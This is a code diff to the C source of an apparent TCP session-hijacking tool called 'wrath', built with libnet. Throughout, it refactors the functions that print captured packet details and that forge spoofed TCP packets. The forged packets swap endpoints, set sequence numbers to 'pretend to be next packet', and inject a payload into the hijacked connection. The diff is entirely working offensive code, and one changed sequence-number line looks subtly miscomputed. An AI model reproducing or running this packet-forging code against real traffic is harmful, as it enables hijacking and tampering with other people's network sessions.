@@ -4,42 +4,23 @@
 /* builds a raw tcp packet
  * @param an argument bundle
  * @param the packet captured */
-void wrath_capture_stats(const u_char *packet) {
-	struct libnet_ipv4_hdr *iphdr;
-	struct libnet_tcp_hdr *tcphdr;	
+void wrath_capture_stats(struct libnet_ipv4_hdr *iphdr, struct libnet_tcp_hdr *tcphdr, int app_length) {
 
-	iphdr = (struct libnet_ipv4_hdr *) (packet + LIBNET_ETH_H);
-	tcphdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);
-
-	short int *total_length = (short int *) (packet + LIBNET_ETH_H + 2); // grabbing packet total length from IP header
-	short int length = LIBNET_ETH_H + ntohs(*total_length);
-	u_char tcp_header_length = (tcphdr->th_off) * 4; // tcp header length
-	int core_header_length = LIBNET_ETH_H + LIBNET_TCP_H + tcp_header_length; 
-	int data_length = length - core_header_length;
-
-	printf("%s:%hu -->", inet_ntoa(iphdr->ip_src), ntohs(tcphdr->th_sport)); // ip_src and ip_dst are in_addr structs
+	printf("%s:%hu -->", inet_ntoa(iphdr->ip_src), ntohs(tcphdr->th_sport));
 	printf(" %s:%hu\n", inet_ntoa(iphdr->ip_dst), ntohs(tcphdr->th_dport));
 	printf("Seq: %u ", ntohl(tcphdr->th_seq));
 	printf("Ack: %u\n", ntohl(tcphdr->th_ack));
 	printf("Control: 0x%04x\n", ntohs(tcphdr->th_flags));
-	printf("Total Length: %d\n", length);
-	printf("TCP Header Length: %d\n", tcp_header_length);
-	printf("Core Header Length: %d\n", core_header_length);
-	printf("%d bytes of data\n\n", data_length);
+	printf("%d bytes of data\n\n", app_length);
 }
 
-void wrath_attack_packet_stats(const u_char *packet, int seq_increment, int ack_increment, int tcp_sum, int payload_size) {
-	struct libnet_ipv4_hdr *iphdr;
-	struct libnet_tcp_hdr *tcphdr;	
+void wrath_attack_packet_stats(struct libnet_ipv4_hdr *iphdr, struct libnet_tcp_hdr *tcphdr, int ack_increment, int tcp_sum, int payload_size) {
 
-	iphdr = (struct libnet_ipv4_hdr *) (packet + LIBNET_ETH_H);
-	tcphdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);
-
-	printf("%s:%hu -->", inet_ntoa(iphdr->ip_dst), ntohs(tcphdr->th_dport)); // ip_src and ip_dst are in_addr structs
+	printf("%s:%hu -->", inet_ntoa(iphdr->ip_dst), ntohs(tcphdr->th_dport));
 	printf(" %s:%hu\n", inet_ntoa(iphdr->ip_src), ntohs(tcphdr->th_sport));
-	printf("Seq: %u ", ntohl(tcphdr->th_ack) + seq_increment);
+	printf("Seq: %u ", ntohl(tcphdr->th_ack));
 	printf("Ack: %u\n", ntohl(tcphdr->th_seq) + ack_increment);
-	printf("Control: %hu\n", tcp_sum);
+	printf("Control: 0x%04x\n", tcp_sum);
 	printf("%d bytes of data\n\n", payload_size);
 	printf("---------------------\n");
 }
@@ -58,9 +39,9 @@ void wrath_tcp_raw_build_and_launch(u_char *args, const u_char *packet) {
 	int tcp_sum = cline_args->tcp_syn + cline_args->tcp_fin + cline_args->tcp_ack + cline_args->tcp_psh + cline_args->tcp_urg + cline_args->tcp_rst;	
 
 	printf("Hijacking ... ");
-	wrath_capture_stats(packet);
+	wrath_capture_stats(iphdr, tcphdr, 0);
 	printf("With ... ");
-	wrath_attack_packet_stats(packet, 0, 0, tcp_sum, 0);
+	wrath_attack_packet_stats(iphdr, tcphdr, 0, tcp_sum, 0);
 	
 	/* libnet_build_tcp */
 	libnet_build_tcp(
@@ -111,7 +92,7 @@ void wrath_tcp_raw_build_and_launch(u_char *args, const u_char *packet) {
  * @param a pointer to an upper-level protocol payload,
  * @param the sum of TCP Flags 
  * @param amount to increment the seq number by */
-void wrath_tcp_belly_build_and_launch(u_char *args, const u_char *packet, unsigned char *payload, unsigned int tcp_sum, int ack_increment) {
+void wrath_tcp_belly_build_and_launch(u_char *args, const u_char *packet, unsigned char *payload, unsigned int tcp_sum, int app_length, int ack_increment) {
 	struct lcp_package *package = (struct lcp_package *) args;
 	libnet_t *libnet_handle = package->libnet_handle;
 	struct arg_values *cline_args = package->cline_args;
@@ -127,15 +108,15 @@ void wrath_tcp_belly_build_and_launch(u_char *args, const u_char *packet, unsign
 	tcphdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);
 
 	printf("Hijacking ... ");
-	wrath_capture_stats(packet);
+	wrath_capture_stats(iphdr, tcphdr, app_length);
 	printf("With ... ");
-	wrath_attack_packet_stats(packet, 0, ack_increment, tcp_sum, sizeof(payload));
+	wrath_attack_packet_stats(iphdr, tcphdr, (app_length + ack_increment), tcp_sum, 0); //strlen(payload)
 	
 	/* libnet_build_tcp */
 	libnet_build_tcp(
 	ntohs(tcphdr->th_dport),	// source port (preted to be from destination port)
 	ntohs(tcphdr->th_sport),	// destination port (pretend to be from source port)
-	ntohl(tcphdr->th_ack),		// +(calc_len(upper_level)),	// seq (pretend to be next packet)
+	ntohl(tcphdr->th_ack + app_length), // +(calc_len(upper_level)),	// seq (pretend to be next packet)
 	ntohl(tcphdr->th_seq),		// ack
 	tcp_sum,			// flags
 	60000,				// window size -- the higher this is the least likely fragmentation will occur
@@ -143,7 +124,7 @@ void wrath_tcp_belly_build_and_launch(u_char *args, const u_char *packet, unsign
 	0,				// URG pointer	
 	0,				// len
 	(u_int8_t *) payload,		// *payload (maybe app-level here)
-	sizeof(payload),		// payload length
+	strlen(payload),		// payload length
 	libnet_handle,			// pointer libnet context	
 	0);				// ptag: 0 = build a new header
 	
